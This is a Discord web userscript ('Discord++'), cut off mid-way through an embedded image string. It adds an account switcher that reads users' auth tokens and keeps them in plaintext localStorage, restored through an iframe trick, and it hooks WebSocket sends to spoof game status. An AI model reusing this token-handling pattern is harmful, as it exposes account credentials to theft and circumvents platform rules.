// ==UserScript==
// @name Discord++ | Take your discord web experience to the next level
// @version 1.2.9.8
// @iconURL   https://i.ibb.co/7znt13j/30162036.png
// @namespace https://greasyfork.org/en/users/735799
// @license      MIT
// @updateURL    https://github.com/FoxsCode/DiscordPlus/raw/main/Discord%2B%2B.user.js
// @downloadURL  https://github.com/FoxsCode/DiscordPlus/raw/main/Discord%2B%2B.user.js
// @name:es Discord++ | Lleva tu experiencia de discord web al siguiente nivel
// @name:ja Discord++ |「DISCORD」Webエクスペリエンスを次のレベルに引き上げる
// @name:fr Discord++ | Faites passer votre expérience Web Discord au niveau supérieur
// @name:ko Discord++ | Take your Discord web experience to the next level
// @name:zh-CN Discord++ | 使您的discord web体验更上一层楼
// @name:zh-TW Discord++ | 使您的discord web體驗更上一層樓
// @name:pt Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-PT Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:pt-BR Discord++ | Leve sua experiência de discórdia na web para o próximo nível
// @name:ro Discord++ | Luați experiența dvs. web discord la nivelul următor
// @name:ru Discord++ | Поднимите свой опыт работы с Discord в Интернете на новый уровень
// @name:it Discord++ | Porta la tua esperienza web con Discord al livello successivo
// @author @FoxCode
// @description Discord++ adds tons of features to your web browser discord! Custom backgrounds, Account-Switcher, Log deleted messages, custom colors, smooth and new animations, better optimization, no rate limits, and much much more! It also comes with it's own theme (it can be disabled).
// @description:es ¡Discord ++ agrega toneladas de características a discord web! Fondos personalizados, registro de mensajes eliminados, colores personalizados, animaciones nuevas y suaves, mejor optimización, sin límites de velocidad y mucho más. También viene con su propio tema (se puede desactivar).
// @description:ja Discord ++はあなたのウェブブラウザの不和にたくさんの機能を追加します！ カスタム背景、ログ削除されたメッセージ、カスタムカラー、スムーズで新しいアニメーション、より良い最適化、レート制限なし、その他多数！ また、独自のテーマが付属しています（無効にすることができます）。
// @description:fr Discord ++ ajoute des tonnes de fonctionnalités à la discorde de votre navigateur Web! Arrière-plans personnalisés, journal des messages supprimés, couleurs personnalisées, animations fluides et nouvelles, meilleure optimisation, aucune limite de débit et bien plus encore! Il est également livré avec son propre thème (il peut être désactivé).
// @description:ko Discord ++는 웹 브라우저의 discord에 수많은 기능을 추가합니다! 사용자 정의 배경, 로그 삭제 메시지, 사용자 정의 색상, 매끄럽고 새로운 애니메이션, 더 나은 최적화, 속도 제한 없음, 그리고 훨씬 더! 또한 자체 테마와 함께 제공됩니다 (비활성화 할 수 있음).
// @description:zh-CN Discord ++为您的Web浏览器的不和谐添加了许多功能！ 自定义背景，记录已删除的消息，自定义颜色，平滑和新的动画，更好的优化，无速率限制等等！ 它还带有它自己的主题（可以禁用）。
// @description:zh-TW Discord ++為您的Web瀏覽器的不和諧添加了許多功能！ 自定義背景，記錄已刪除的消息，自定義顏色，平滑和新的動畫，更好的優化，無速率限制等等！ 它還帶有它自己的主題（可以禁用）。
// @description:pt-BR Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt-PT Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:pt Discord ++ adiciona toneladas de recursos à discórdia do seu navegador da web! Planos de fundo personalizados, logs de mensagens excluídos, cores personalizadas, animações novas e suaves, melhor otimização, sem limites de taxa e muito, muito mais! Ele também vem com seu próprio tema (pode ser desativado).
// @description:ro Discord ++ adaugă multe funcții discordiei browserului dvs. web! Fundaluri personalizate, jurnale de mesaje șterse, culori personalizate, animații netede și noi, optimizare mai bună, fără limite de rată și multe altele! De asemenea, vine cu propria temă (poate fi dezactivată).
// @description:ru Discord ++ добавляет множество функций в Discord вашего веб-браузера! Пользовательские фоны, удаленные журналы сообщений, пользовательские цвета, плавная и новая анимация, улучшенная оптимизация, отсутствие ограничений по скорости и многое другое! Он также имеет собственную тему (ее можно отключить).
// @description:it Discord ++ aggiunge tonnellate di funzionalità alla discordia del tuo browser web! Sfondi personalizzati, registri dei messaggi eliminati, colori personalizzati, animazioni nuove e fluide, migliore ottimizzazione, nessun limite di velocità e molto altro ancora! Inoltre viene fornito con il proprio tema (può essere disabilitato).
// @grant        GM_registerMenuCommand
// @grant        GM_unregisterMenuCommand
// @grant none
// @match        https://discordapp.com/activ*
// @match        https://discordapp.com/channel*
// @match        https://discord.com/activ*
// @match        https://discord.com/channel*
// @match        https://discord.com/channels/*
// @include https://discord.com/*
// @require https://greasyfork.org/scripts/21927-arrive-js/code/arrivejs.js?version=198809
// @require http://code.jquery.com/jquery-latest.js
// @require      https://cdn.jsdelivr.net/lodash/4.17.2/lodash.min.js
// @require      https://code.jquery.com/jquery-3.1.1.min.js
// ==/UserScript==
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| @grant compatibility |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
function GM_addStyle(aCss) {
    var head = document.getElementsByTagName('head')[0];
    if (head) {
        var style = document.createElement('style');
        style.setAttribute('type', 'text/css');
        style.textContent = aCss;
        head.appendChild(style);
        return style;
    }
    return null;
}

const GM_log = console.log;

// This naive implementation will simply fail to do cross-domain requests,
// just like any javascript in any page would.
function GM_xmlhttpRequest(aOpts) {
    var req = new XMLHttpRequest();

    __setupRequestEvent(aOpts, req, 'abort');
    __setupRequestEvent(aOpts, req, 'error');
    __setupRequestEvent(aOpts, req, 'load');
    __setupRequestEvent(aOpts, req, 'progress');
    __setupRequestEvent(aOpts, req, 'readystatechange');

    req.open(aOpts.method, aOpts.url, !aOpts.synchronous,
             aOpts.user || '', aOpts.password || '');
    if (aOpts.overrideMimeType) {
        req.overrideMimeType(aOpts.overrideMimeType);
    }
    if (aOpts.headers) {
        for (var prop in aOpts.headers) {
            if (Object.prototype.hasOwnProperty.call(aOpts.headers, prop)) {
                req.setRequestHeader(prop, aOpts.headers[prop]);
            }
        }
    }
    var body = aOpts.data ? aOpts.data : null;
    if (aOpts.binary) {
        return req.sendAsBinary(body);
    } else {
        return req.send(body);
    }
}

function __setupRequestEvent(aOpts, aReq, aEventName) {
    if (!aOpts['on' + aEventName]) return;

    aReq.addEventListener(aEventName, function(aEvent) {
        var responseState = {
            responseText: aReq.responseText,
            responseXML: aReq.responseXML,
            readyState: aReq.readyState,
            responseHeaders: null,
            status: null,
            statusText: null,
            finalUrl: null
        };
        switch (aEventName) {
            case "progress":
                responseState.lengthComputable = aEvent.lengthComputable;
                responseState.loaded = aEvent.loaded;
                responseState.total = aEvent.total;
                break;
            case "error":
                break;
            default:
                if (4 != aReq.readyState) break;
                responseState.responseHeaders = aReq.getAllResponseHeaders();
                responseState.status = aReq.status;
                responseState.statusText = aReq.statusText;
                break;
        }
        aOpts['on' + aEventName](responseState);
    });
}

const __GM_STORAGE_PREFIX = [
    '', GM_info.script.namespace, GM_info.script.name, ''].join('***');

// All of the GM_*Value methods rely on DOM Storage's localStorage facility.
// They work like always, but the values are scoped to a domain, unlike the
// original functions.  The content page's scripts can access, set, and
// remove these values.  A
function GM_deleteValue(aKey) {
    localStorage.removeItem(__GM_STORAGE_PREFIX + aKey);
}

function GM_getValue(aKey, aDefault) {
    var val = localStorage.getItem(__GM_STORAGE_PREFIX + aKey);
    if (null === val && 'undefined' != typeof aDefault) return aDefault;
    return val;
}

function GM_listValues() {
    var prefixLen = __GM_STORAGE_PREFIX.length;
    var values = [];
    var i = 0;
    for (var i = 0; i < localStorage.length; i++) {
        var k = localStorage.key(i);
        if (k.substr(0, prefixLen) === __GM_STORAGE_PREFIX) {
            values.push(k.substr(prefixLen));
        }
    }
    return values;
}

function GM_setValue(aKey, aVal) {
    localStorage.setItem(__GM_STORAGE_PREFIX + aKey, aVal);
}

function GM_getResourceURL(aName) {
    return 'greasemonkey-script:' + GM_info.uuid + '/' + aName;
}
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| Multiple Accounts ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
(function() {
    'use strict';
    const v = "1.6";
    const apiPrefix = "https://discord.com/api/v8";
    let neededClasses = [];
    let functionKeeper = webpackJsonp[0][1];

    let classesContain = [
        ["menu","scroller","styleFixed","styleFlexible","item","hideInteraction","customItem","labelContainer","label","subtext","iconContainer","icon","hintContainer","imageContainer","caret","image","disabled","separator","submenuContainer","submenuPaddingContainer","submenu","colorDefault","checkbox","radioSelection","check","focused","colorBrand","colorDanger","colorPremium","groupLabel"],
        ["statusItem","status","icon","description","customStatusItem","customStatusWithEmoji","customEmoji","customEmojiPlaceholder","customText","clearStatusButton","clearStatusIcon"],
        ["layerContainer","layer","layerHidden","disabledPointerEvents"],
        ["backdrop","backdropWithLayer"],
        ["backdrop","layer"],
        ["responsiveWidthMobile","innerPadding","focusLock","root","small","medium","large","fullscreenOnMobile","footer","header","separator","content","close","hideOnFullscreen"],
        ["artHeight","emojiSize","emojiMargin","formGroup","modalRoot","inputContainer","modalCloseButton","headerText","emojiButton","fullOpacity","emojiButtonContainer","emoji","input","clearButton","clearIcon","headerContainer","header","art","cancelButton"],
        ["_flex","_horizontal","_horizontalReverse","flex","horizontal","horizontalReverse","flexChild","flexMarginReset"],
        ["flex","alignStart","alignEnd","alignCenter","alignStretch","alignBaseline","justifyStart","justifyEnd","justifyCenter","justifyAround","justifyBetween","noWrap","wrap","wrapReverse","directionRow","directionRowReverse","directionColumn","spacer","vertical","horizontal","horizontalReverse","flexCenter"],
        ["button","lookFilled","colorBrand","spinnerItem","lookInverted","lookOutlined","lookGhost","lookLink","contents","hoverBrand","hasHover","colorGrey","hoverGrey","colorRed","hoverRed","colorGreen","hoverGreen","colorYellow","hoverYellow","colorLink","hoverLink","colorWhite","hoverWhite","colorBlack","hoverBlack","colorPrimary","hoverPrimary","colorTransparent","hoverTransparent","lookBlank","sizeTiny","sizeSmall","sizeMedium","sizeLarge","sizeXlarge","sizeMin","sizeMax","sizeIcon","grow","fullWidth","submitting","spinner","disabledButtonWrapper","disabledButtonOverlay"],
        ["scrollerBase","thin","fade","scrolling","auto","none","content","disableScrollAnchor"],
        ["container","downloadProgressCircle","guilds","base","sidebar","hasNotice","panels","content","activityPanel","hiddenOnMobileStore"],
        ["notice","colorDefault","button","colorNeutral","colorDownload","colorNotification","colorDark","colorPremium","colorPremiumTier1","colorPremiumTier2","colorInfo","colorSuccess","colorDanger","colorStreamerMode","colorSpotify","platformIcon","colorBrand","colorCustom","closeButton","buttonMinor"],
    ];
    let ccSet = [];
    for (let i = 0; i < classesContain.length; i++) {
        const element = classesContain[i];
        ccSet.push(new Set(element));
    }
    for (const key in functionKeeper) {
        if (functionKeeper.hasOwnProperty(key)) {
            const element = functionKeeper[key];
            let ans = {};
            element(ans);
            ans = ans.exports;
            if(ans != undefined || ans != null){
                ans = Object.keys(ans);
                let a = new Set(ans);
                for (let j = 0; j < ccSet.length; j++) {
                    const element2 = ccSet[j];
                    if(eqSet(element2, a)){
                        neededClasses[j] = key;
                    }
                }
            }
        }
    }
    function eqSet(as, bs) {
        if (as.size !== bs.size) return false;
        for (var a of as) if (!bs.has(a)) return false;
        return true;
    }
    let allClasses = {};
    const createElm = (html) => {
        const temp = document.createElement('div');
        temp.innerHTML = html;
        return temp.removeChild(temp.firstElementChild);
        //webpackJsonp[0][1][neededClasses[0]].toString(); is the way
    }
    const insertCss = (css) => {
        const style = document.createElement('style');
        style.appendChild(document.createTextNode(css));
        document.head.appendChild(style);
        return style;
    }
    insertCss(`.customAccount {background-image: url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0iI0I5QkJCRSIgd2lkdGg9IjE4cHgiIGhlaWdodD0iMThweCI+PHBhdGggZD0iTTAgMGgyNHYyNEgweiIgZmlsbD0ibm9uZSIvPjxwYXRoIGQ9Ik0xNiAxMWMxLjY2IDAgMi45OS0xLjM0IDIuOTktM1MxNy42NiA1IDE2IDVjLTEuNjYgMC0zIDEuMzQtMyAzczEuMzQgMyAzIDN6bS04IDBjMS42NiAwIDIuOTktMS4zNCAyLjk5LTNTOS42NiA1IDggNUM2LjM0IDUgNSA2LjM0IDUgOHMxLjM0IDMgMyAzem0wIDJjLTIuMzMgMC03IDEuMTctNyAzLjVWMTloMTR2LTIuNWMwLTIuMzMtNC42Ny0zLjUtNy0zLjV6bTggMGMtLjI5IDAtLjYyLjAyLS45Ny4wNSAxLjE2Ljg0IDEuOTcgMS45NyAxLjk3IDMuNDVWMTloNnYtMi41YzAtMi4zMy00LjY3LTMuNS03LTMuNXoiLz48L3N2Zz4=);background-size: contain;background-repeat: no-repeat;}
               .changeAccount {grid-area: icon;margin-left: -2px;width: 16px;height: 16px;}
               .accountChooserContainer {z-index: 9999999;display: flex;height: 70px;}
               .accountChooserAvatar {border-radius: 50%; align-self: center;height: 80%;}
               .accountName {align-self: center;font-size: x-large;font-weight: 400;color: var(--interactive-active);}
               .accountLogin {margin-left: auto;align-self: center;padding: 8px 20px;background-color: #43b581;font-weight: 900;color: #fff;border-radius: 5px;}
               .accountLogin:hover {background-color: #3ca374;}
               .accountDiscriminator{align-self: center;margin-top: 7px;color: var(--header-secondary);}
               #addAccount{margin-left: auto;margin: 10px auto;color: var(--header-secondary);cursor: pointer;}
               #addAccount:hover{text-decoration: underline;}
               .versionNotifier {background-color: #6b1ba7;}
               #changeLogButtonClick:hover {color: #6b1ba7;}
        `);
    function parseAllClasses(){
        for (var i = 0; i < neededClasses.length; i++) {
            let x = {};
            webpackJsonp[0][1][neededClasses[i]](x);
            allClasses[neededClasses[i]] = x.exports;
        }
        console.log(allClasses);
    }
    window.onclick = () => {
        let cont = document.getElementsByClassName("menu-3sdvDG styleFixed-sX-yHV");
        if(cont.length > 0 && !document.getElementById("status-picker-account")){
            cont[0].appendChild(createElm(`<div role="separator" class="${allClasses[neededClasses[0]].separator}"></div>`));
            let elmnt = createElm(`<div class="${allClasses[neededClasses[0]].item}" style="margin-bottom: 163px;" aria-disabled="false" role="menuitem" id="status-picker-account" tabindex="-1"><div class="${allClasses[neededClasses[1]].statusItem}" aria-label="Set a custom status"><div class="changeAccount customAccount"></div><div class="${allClasses[neededClasses[1]].status}">Change account</div></div></div>`);
            elmnt.onmouseover = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
                elmnt.classList.add(allClasses[neededClasses[0]].focused);
            }
            elmnt.onmouseleave = () => {
                let allElmnts = document.getElementsByClassName(allClasses[neededClasses[0]].item);
                for (var i = 0; i < allElmnts.length; i++) {
                    allElmnts[i].classList.remove(allClasses[neededClasses[0]].focused);
                }
            }
            elmnt.onclick = openPicker;
            cont[0].appendChild(elmnt);
        }
        if(localStorage.versionMA != 69 && !document.getElementsByClassName("versionNotifier")[0]){
            let baseElement = document.getElementsByClassName(allClasses[neededClasses[11]].base);
            if(baseElement[0]){
                baseElement[0].prepend(createElm(`<div class="${allClasses[neededClasses[12]].notice} ${allClasses[neededClasses[12]].colorDefault} versionNotifier"><div class="${allClasses[neededClasses[12]].closeButton}" id="versionNotifierCloseButton" aria-label="Dismiss" role="button" tabindex="0"></div>Multiple Discord Accounts ${v} makes corners rounder!<button id="changeLogButtonClick" class="${allClasses[neededClasses[12]].button}">View changes</button></div>`));
                document.getElementById("changeLogButtonClick").onclick = () => {
                    window.open("https://github.com/cazeip/MultipleAccounts/blob/master/changes.md");
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = 1;
                }
                document.getElementById("versionNotifierCloseButton").onclick = () => {
                    document.getElementsByClassName("versionNotifier")[0].remove();
                    localStorage.versionMA = 1;
                }
            }
        }
    }
    function getUserInfo(){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/@me", {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
            .catch(console.error);
    }
    function getUser(userID){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + "/users/"+userID, {
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method: "GET",
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
            .catch(console.error);
    }
    async function fillLocalStorage(){
        let info = await getUserInfo();
        window.dispatchEvent(new Event('beforeunload'));
        info.token = JSON.parse(localStorage.getItem("token"));
        localStorage.setItem("multipleAccounts", JSON.stringify([{id:info.id, token: info.token}]));
    }
    function apiCall(apiPath, body, method = "GET"){
        window.dispatchEvent(new Event('beforeunload'));
        let currentToken = JSON.parse(localStorage.getItem("token"));
        return fetch(apiPrefix + apiPath, {
            body: body ? JSON.stringify(body) : undefined,
            headers: {
                Accept: "*/*",
                "Accept-Language": "en-US",
                Authority: "discordapp.com",
                Authorization: currentToken,
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.301 Chrome/56.0.2924.87 Discord/1.6.15 Safari/537.36",
            },
            method,
        }).then((res) => (res.status === 200 ? res.json() : Promise.resolve()))
            .catch(console.error);
    }
    function changeAccount(newToken){
        window.dispatchEvent(new Event('beforeunload'));
        let token = JSON.parse(localStorage.token);
        window.location.href = "http://discord.com/login";
        localStorage.token = "\""+newToken+"\"";
        if (newToken == "--[LogIn]--") {
            localStorage.removeItem("token");
        }
    }
    async function openPicker(){
        if(localStorage.getItem("multipleAccounts") == null || localStorage.getItem("multipleAccounts") == undefined){
            await fillLocalStorage();
        }else{
            let info = await getUserInfo();
            let localSt = JSON.parse(localStorage.getItem("multipleAccounts"));
            let def = false;
            for (let i = 0; i < localSt.length; i++) {
                if(localSt[i].id === info.id){
                    def = true;
                }
            }
            if(!def){
                localSt.push({id: info.id, token: JSON.parse(localStorage.getItem("token"))});
            }
            localStorage.setItem("multipleAccounts", JSON.stringify(localSt));
        }
        let info = JSON.parse(localStorage.getItem("multipleAccounts"));
        if(document.getElementById("accountPickerModal")) return;
        let a = document.getElementsByClassName(allClasses[neededClasses[2]].layerContainer);
        let y = createElm(`<div id="accountPickerBg" class="${allClasses[neededClasses[3]].backdropWithLayer}" style="z-index: 9999999; opacity: 0; background-color: rgb(0, 0, 0); transform: translateZ(0px);transition: opacity 0.2s;"></div>`);
        y.onclick = closePicker;
        a[a.length - 1].appendChild(y);
        let x = createElm(`<div class="${allClasses[neededClasses[4]].layer}" id="accountPickerModal" style="z-index: 9999999;"> <div class="${allClasses[neededClasses[5]].focusLock}" role="dialog" aria-label="Set a custom status" tabindex="-1" aria-modal="true"> <div class="${allClasses[neededClasses[6]].modalRoot} ${allClasses[neededClasses[5]].root} ${allClasses[neededClasses[5]].small} ${allClasses[neededClasses[5]].fullscreenOnMobile}" id="animatedModal" style="z-index: 101;opacity: 0;transform: scale(0.2);transition: transform .2s, opacity .2s;"> <div class="${allClasses[neededClasses[7]].flex} ${allClasses[neededClasses[7]]._horizontal} ${allClasses[neededClasses[8]].justifyStart} ${allClasses[neededClasses[8]].alignCenter} ${allClasses[neededClasses[8]].noWrap} ${allClasses[neededClasses[5]].header} ${allClasses[neededClasses[6]].headerContainer}" id="replaceBackground" style="flex: 0 0 auto;background-position: bottom;background-size: cover;background-image: url(https://cdn.discordapp.com/attachments/768475463524941865/768481090087944233/pawel-nolbert-4u2U8EO9OzY-unsplash.jpg);padding: 30px;"> <div class="${allClasses[neededClasses[6]].header}" style="padding-top: 0;"><h4 class="${allClasses[neededClasses[6]].headerText}">Choose a Discord account</h4></div><button id="closeXbutton" aria-label="Close" type="button" class="${allClasses[neededClasses[5]].close} ${allClasses[neededClasses[6]].modalCloseButton} ${allClasses[neededClasses[9]].button} ${allClasses[neededClasses[9]].lookBlank} ${allClasses[neededClasses[9]].colorBrand} ${allClasses[neededClasses[9]].grow}"> <div class="${allClasses[neededClasses[9]].contents}"> <svg aria-hidden="false" width="24" height="24" viewBox="0 0 24 24"><path fill="currentColor" d="M18.4 4L12 10.4L5.6 4L4 5.6L10.4 12L4 18.4L5.6 20L12 13.6L18.4 20L20 18.4L13.6 12L20 5.6L18.4 4Z"></path></svg> </div></button> </div><div id="accountLinesContainer" class="${allClasses[neededClasses[5]].content} ${allClasses[neededClasses[10]].thin}" dir="ltr" style="overflow: hidden scroll; padding-right: 8px; padding-top: 10px;"></div><span id="addAccount">Not seeing your account? Click here to add one.</span></div></div></div>`);
        a[a.length - 1].appendChild(x);
        document.getElementById("closeXbutton").onclick = closePicker;
        document.getElementsByClassName(allClasses[neededClasses[2]].layer)[0].style.display = "none";
        document.getElementById("addAccount").onclick = () => {
            changeAccount("--[LogIn]--");
        }
        setTimeout(async () => {
            document.getElementById("accountPickerBg").style.opacity = "0.85";
            document.getElementById("animatedModal").style.transform = "scale(1)";
            document.getElementById("animatedModal").style.opacity = "1";
            for (let i = 0; i < info.length; i++) {
                let line;
                let user = await getUser(info[i].id);
                if(user.avatar == null){
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/embed/avatars/${user.discriminator % 5}.png"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }else{
                    line = createElm(`<div class="accountChooserContainer"><img class="accountChooserAvatar" src="https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=128"><div style="margin-left: 20px;align-self: center;display: flex;flex-direction: column;"><div><span class="accountName">${user.username}</span><span class="accountDiscriminator">#${user.discriminator}</span></div><span style="color: var(--text-muted);padding-top: 2px;padding-left: 0;">ID: ${user.id}</span></div><button id="AccountSwitchButton${i}" class="accountLogin">Log in</button></div>`);
                }
                document.getElementById("accountLinesContainer").appendChild(line);
                document.getElementById("AccountSwitchButton"+i).onclick = () => {
                    changeAccount(info[i].token);
                }
            }
        }, 100);
    }
    function closePicker(){
        document.getElementById("accountPickerBg").style.opacity = "0";
        document.getElementById("animatedModal").style.transform = "scale(0.2)";
        document.getElementById("animatedModal").style.opacity = "0";
        setTimeout( () => {
            document.getElementById("accountPickerBg").remove();
            document.getElementById("accountPickerModal").remove();
        }, 201);
    }
    window.localStorage = document.body.appendChild(document.createElement('iframe')).contentWindow.localStorage;
    parseAllClasses();
})();

/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||| GameStatus |||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
/*||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||*/
window.eval(`

const real_ws_send = window.WebSocket.prototype.send;
console.log("[DiscordGameStatus] Hijacking WebSocket send function:", real_ws_send);

window._dgs_last_status_ = "online";

window.WebSocket.prototype.send = function (data) {
	if (window._ws_ != this) {
		window._ws_ = this;
		console.log("[DiscordGameStatus] Grabbed Websocket object through the send() hook:", this);
	}

	let data_tab = JSON.parse(data);
	if (data_tab && data_tab.op == 3) { // op 3 needs to be patched with our stored game info data
		window._dgs_last_status_ = data_tab.d.status;
		data_tab.d.game = window._dgs_game_entry_;
		data = JSON.stringify(data_tab);
	}
	return real_ws_send.call (this, data);
};

const button_icon = 'data:image/svg+xml;base64,PHN2ZyB4bWxuczpkYz0iaHR0cDovL3B1cmwub3JnL2RjL2VsZW1lbnRzLzEuMS8iIHhtbG5zOmNjPSJodHRwOi8vY3JlYXRpdmVjb21tb25zLm9yZy9ucyMiIHhtbG5zOnJkZj0iaHR0cDovL3d3dy53My5vcmcvMTk5OS8wMi8yMi1yZGYtc3ludGF4LW5zIyIgeG1sbnM6c3ZnPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgeG1sbnM6c29kaXBvZGk9Imh0dHA6Ly9zb2RpcG9kaS5zb3VyY2Vmb3JnZS5uZXQvRFREL3NvZGlwb2RpLTAuZHRkIiB4bWxuczppbmtzY2FwZT0iaHR0cDovL3d3dy5pbmtzY2FwZS5vcmcvbmFtZXNwYWNlcy9pbmtzY2FwZSIgd2lkdGg9IjIxNSIgaGVpZ2h0PSIxNDAiIHZpZXdCb3g9IjAgMCA3NjEuOCA0OTYuMSIgaWQ9InN2Zzc0NjQiIHZlcnNpb249IjEuMSIgaW5rc2NhcGU6dmVyc2lvbj0iMC45IiBzb2RpcG9kaTpkb2NuYW1lPSJzdW5ueS5zdmciPjxzdHlsZT4uczB7c3RvcC1jb2xvcjojODI4NTg0O3N0b3Atb3BhY2l0eToxO30uczF7c3RvcC1jb2xvcjojNjc2YTZhO3N0b3Atb3BhY2l0eToxO30uczJ7c3RvcC1jb2xvcjojYzZjNmM2O3N0b3Atb3BhY2l0eTowO30uczN7c3RvcC1jb2xvcjojZTJlMmUyO3N0b3Atb3BhY2l0eTowO30uczR7c3RvcC1jb2xvcjojZmZmZmZmO3N0b3Atb3BhY2l0eTowO30uczV7Y29sb3ItaW50ZXJwb2xhdGlvbi1maWx0ZXJzOnNSR0I7fS5zNntmaWxsOiM5Mjk2OTU7fS5zN3tmaWxsOiMyYjMyMzY7fS5zOHtmaWxsOiNlMmU2ZTg7ZmlsdGVyOnVybCgjZmlsdGVyNjU1OSk7fS5zOXtmaWxsOiMxNzFiMWQ7fS5zMTB7ZmlsbDojY2NjZWNlO30uczExe2ZpbGw6bm9uZTtzdHJva2Utd2lkdGg6MjtzdHJva2U6I2ZmZjt9LnMxMntmaWxsOiNmOWY5Zjk7fS5zMTN7ZmlsbDpub25lO3N0cm9rZS1saW5lam9pbjpyb3VuZDtzdHJva2U6IzhiYTFiMTt9LnMxNHtmaWxsOiMxNzFiMWQ7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6MTA7bGV0dGVyLXNwYWNpbmc6MDtsaW5lLWhlaWdodDoxMjU7d29yZC1zcGFjaW5nOjA7fS5zMTV7LWlua3NjYXBlLWZvbnQtc3BlY2lmaWNhdGlvbjpacm5pYztmaWxsOiMxNzFiMWQ7Zm9udC1mYW1pbHk6WnJuaWM7fS5zMTZ7LWlua3NjYXBlLWZvbnQtc3BlY2lmaWNhdGlvbjonc2VyaWYgQm9sZCc7ZmlsbDojMTcxYjFkO2ZvbnQtZmFtaWx5OnNlcmlmO2ZvbnQtd2VpZ2h0OmJvbGQ7fS5zMTd7ZmlsbDpub25lO3N0cm9rZS13aWR0aDoyO3N0cm9rZTojODI4NTg0O30uczE4e2ZpbGw6I2ZmZjt9LnMxOXtiYXNlbGluZS1zaGlmdDpiYXNlbGluZTtibG9jay1wcm9ncmVzc2lvbjp0YjtjbGlwLXJ1bGU6bm9uemVybztjb2xvci1pbnRlcnBvbGF0aW9uLWZpbHRlcnM6bGluZWFyUkdCO2NvbG9yLWludGVycG9sYXRpb246c1JHQjtjb2xvci1yZW5kZXJpbmc6YXV0bztjb2xvcjojMDAwMDAwO2RpcmVjdGlvbjpsdHI7ZGlzcGxheTppbmxpbmU7ZW5hYmxlLWJhY2tncm91bmQ6YWNjdW11bGF0ZTtmaWxsLXJ1bGU6bm9uemVybztmaWxsOiNmOWY5Zjk7Zm9udC1mYW1pbHk6c2Fucy1zZXJpZjtmb250LXNpemU6bWVkaXVtO2ltYWdlLXJlbmRlcmluZzphdXRvO2lzb2xhdGlvbjphdXRvO2xldHRlci1zcGFjaW5nOm5vcm1hbDtsaW5lLWhlaWdodDpub3JtYWw7bWl4LWJsZW5kLW1vZGU6bm9ybWFsO292ZXJmbG93OnZpc2libGU7c2hhcGUtcmVuZGVyaW5nOmF1dG87c29saWQtY29sb3I6IzAwMDAwMDtzb2xpZC1vcGFjaXR5OjE7dGV4dC1hbGlnbjpzdGFydDt0ZXh0LWFuY2hvcjpzdGFydDt0ZXh0LWRlY29yYXRpb24tY29sb3I6IzAwMDAwMDt0ZXh0LWRlY29yYXRpb24tbGluZTpub25lO3RleHQtZGVjb3JhdGlvbi1zdHlsZTp